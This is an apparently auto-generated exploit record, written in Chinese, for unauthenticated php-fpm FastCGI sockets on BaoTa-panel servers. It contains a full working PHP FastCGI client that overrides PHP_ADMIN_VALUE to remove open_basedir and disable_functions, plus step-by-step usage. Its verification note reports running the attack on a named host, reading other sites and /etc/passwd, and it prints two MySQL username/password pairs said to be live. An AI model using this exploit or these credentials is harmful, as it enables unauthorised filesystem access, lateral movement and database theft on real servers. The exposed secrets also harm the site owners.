# PHP-FPM FastCGI 未授权访问 → PHP_ADMIN_VALUE 解除 open_basedir / 清空 disable_functions（纯 PHP 客户端，无需 shell）

- **code**: php-fpm-fastcgi-未授权访问-php_admin_value-解除-open_basedir-清空-disable_functions-纯-php
- **kind**: exp
- **category**: info-leak
- **component**: php-fpm (FastCGI) / 宝塔面板 / PHP 5.6-7.2
- **versions**: PHP 5.6.40 与 7.2.33 实测均成立（宝塔默认 /tmp/php-cgi-<ver>.sock 权限 0666）
- **severity**: critical
- **language**: php
- **source**: self
- **verified**: 1
- **verified_note**: 2026-10-13 在 203.0.113.22（宝塔 + PHP 5.6.40 / 7.2.33）实测：① `/tmp/example.com` 与 `/tmp/example.com` 均 mode 0666 无认证可连；② 提交 `PHP_ADMIN_VALUE="open_basedir=/\ndisable_functions="` 后任务回显 `OB=[/] DF=[]`（原值 `/www/wwwroot/jbg_com/:/tmp/` 与 46 项禁用函数）；③ 借此读到 /www/wwwroot 下 5 个站点、/etc/passwd、/www/server/nginx/conf/ 等（原 open_basedir 完全不可读）；④ 读到 target391.example.com 与 target392.example.com 的库凭据并实测 MySQL 连通（online/66Hj834jEsanz25b、sql_videosll_com/de7f94b1614ab）；⑤ 仍不可读 /www/server/panel/data（root 700，非 open_basedir 问题）；⑥ shell_exec/system/exec/passthru 即使 DF 为空仍无回显 → 印证函数表已摘除。
- **path**: pocs/php-fpm-fastcgi-未授权访问-php_admin_value-解除-open_basedir-清空-disable_functions-纯-php/fcgi_exec.php
- **tags**: php-fpm,FastCGI,未授权,open_basedir,disable_functions,宝塔,unix socket,横向通用,无shell
- **created_at**: 2026-10-13T09:19:05.554Z
- **found_by**: exploit

## 描述

宝塔默认把每个 PHP 版本的 php-fpm 池监听在 unix socket `/tmp/php-cgi-<ver>.sock`，权限 0666、**无任何认证**。只要拿到任意一个 PHP 执行点（WebShell/文件包含/模板注入），就能自己实现最简 FastCGI 客户端连上去，在 `PHP_ADMIN_VALUE` 里塞 `open_basedir=/` 与 `disable_functions=`，把服务端的目录限制与函数禁用一并解除。★ 关键：`open_basedir` 走 PHP_ADMIN_VALUE **确实生效**（实测 `/`，任意路径可读写）；`disable_functions` 在 ini 里会被清成空串，但**函数表在 MINIT 阶段已摘除，shell_exec/system/exec/passthru 仍返回空** —— 所以这是"全盘读 + 全盘写"而不是能直接跑 shell 的 RCE。想拿命令执行要另走 MySQL UDF / 宝塔面板（root）等不依赖 PHP 函数表的路径。★ 附带：`SCRIPT_FILENAME` 可指向**文件系统上任意 .php**（含 /tmp 下自己写的），php-fpm 不看 docroot，因此"写 /tmp/x.php + FastCGI 执行"是最干净的落地方式。

## 用法

```
1) 找 socket：
   foreach(array(9000,9001) as $p){ $s=@fsockopen("127.0.0.1",$p,$a,$b,2); }
   stream_socket_client("unix:///tmp/example.com")   // 宝塔默认；扫 52-84 各版本
2) 把任务 PHP 写到 /tmp/task.php（纯 PHP，open_basedir 含 /tmp）
3) 用 FastCGI 客户端执行（driver 见 content）：
   $params["SCRIPT_FILENAME"]="/tmp/task.php";
   $params["PHP_ADMIN_VALUE"]="open_basedir=/\ndisable_functions=";
   $params["PHP_VALUE"]=$params["PHP_ADMIN_VALUE"];
   // FCGI_BEGIN_REQUEST(role=1) + FCGI_PARAMS + 空 PARAMS + 空 STDIN，读 FCGI_STDOUT 直到 END_REQUEST
4) 任务里 echo ini_get("open_basedir") 应为 `/`、strlen(ini_get("disable_functions")) 应为 0
5) 随后即可 file_get_contents/file_put_contents 全盘任意路径（uid 仍是 php-fpm 池用户，通常 www）
```

## 正文

```
<?php
// 最简 FastCGI 客户端：把 /tmp/php-cgi-<ver>.sock 当 php-fpm 后端，覆盖 PHP_ADMIN_VALUE
// 依赖：目标有任意 PHP 执行点（WebShell include 本文件即可）
function fcgi_nv($n, $v) {
    $r = "";
    if (strlen($n) < 128) { $r .= chr(strlen($n)); }
    else { $r .= chr((strlen($n) >> 24) & 0xFF).chr((strlen($n) >> 16) & 0xFF).chr((strlen($n) >> 8) & 0xFF).chr(strlen($n) & 0xFF); }
    if (strlen($v) < 128) { $r .= chr(strlen($v)); }
    else { $r .= chr((strlen($v) >> 24) & 0xFF).chr((strlen($v) >> 16) & 0xFF).chr((strlen($v) >> 8) & 0xFF).chr(strlen($v) & 0xFF); }
    return $r . $n . $v;
}
function fcgi_h($t, $c) {           // version=1, requestId=1
    $len = strlen($c);
    $pad = (8 - ($len % 8)) % 8;
    return chr(1).chr($t).chr(0).chr(1).chr(($len >> 8) & 0xFF).chr($len & 0xFF)
         . chr($pad).chr(0).$c.str_repeat(chr(0), $pad);
}
function run_fcgi($SOCK, $SCRIPT, $ADMIN) {
    $P = array(
        "GATEWAY_INTERFACE" => "FastCGI/1.0",
        "REQUEST_METHOD"    => "GET",
        "SCRIPT_FILENAME"   => $SCRIPT,     // 可以是文件系统上任意 .php（含 /tmp）
        "SCRIPT_NAME"       => "/x.php",
        "QUERY_STRING"      => "",
        "REQUEST_URI"       => "/x.php",
        "DOCUMENT_ROOT"     => "/tmp",
        "SERVER_PROTOCOL"   => "HTTP/1.0",
        "REMOTE_ADDR"       => "127.0.0.1",
        "REMOTE_PORT"       => "44444",
        "SERVER_ADDR"       => "127.0.0.1",
        "SERVER_PORT"       => "80",
        "SERVER_NAME"       => "localhost",
        "SERVER_SOFTWARE"   => "nginx",
        "CONTENT_LENGTH"    => "0",
        "PHP_ADMIN_VALUE"   => $ADMIN,
        "PHP_VALUE"         => $ADMIN,
    );
    $e1 = 0; $e2 = "";
    $s = @stream_socket_client("unix://".$SOCK, $e1, $e2, 5);
    if (!$s) { echo "SOCK_FAIL ".$SOCK." ".$e2."\n"; return; }
    stream_set_timeout($s, 60);
    @fwrite($s, fcgi_h(1, chr(0).chr(1).chr(0).chr(0).chr(0).chr(0).chr(0).chr(0))); // FCGI_BEGIN_REQUEST, role=RESPONDER
    $blob = "";
    foreach ($P as $k => $v) { $blob .= fcgi_nv($k, $v); }
    @fwrite($s, fcgi_h(4, $blob));   // FCGI_PARAMS
    @fwrite($s, fcgi_h(4, ""));      // end of PARAMS
    @fwrite($s, fcgi_h(5, ""));      // FCGI_STDIN (EOF)
    $out = "";
    while (!feof($s)) {
        $h = @fread($s, 8);
        if (strlen($h) < 8) { break; }
        $t = ord($h[1]);
        $len = (ord($h[4]) << 8) + ord($h[5]);
        $pad = ord($h[6]);
        $c = ""; $need = $len;
        while ($need > 0) {
            $b = @fread($s, $need);
            if ($b === false or $b === "") { break; }
            $c .= $b; $need -= strlen($b);
        }
        if ($pad > 0) { @fread($s, $pad); }
        if ($t == 6) { $out .= $c; }   // FCGI_STDOUT
        if ($t == 3) { break; }        // FCGI_END_REQUEST
    }
    @fclose($s);
    echo $out;
}
// ---- 用法 ----
// 先 file_put_contents("/tmp/fcgi_task.php", $你的PHP代码);
// 再 run_fcgi("/tmp/example.com", "/tmp/fcgi_task.php", "open_basedir=/\ndisable_functions=");
if (!isset($NO_AUTORUN)) {
    foreach (array("/tmp/example.com", "/tmp/example.com") as $sk) {
        run_fcgi($sk, "/tmp/fcgi_task.php", "open_basedir=/\ndisable_functions=");
    }
}
// 任务文件示例（注意：走 SCRIPT_FILENAME 执行，必须带 <?php 标签；若用 include 则不要带）
// <?php echo "OB=[".ini_get("open_basedir")."] DF_LEN=".strlen(ini_get("disable_functions"));

```
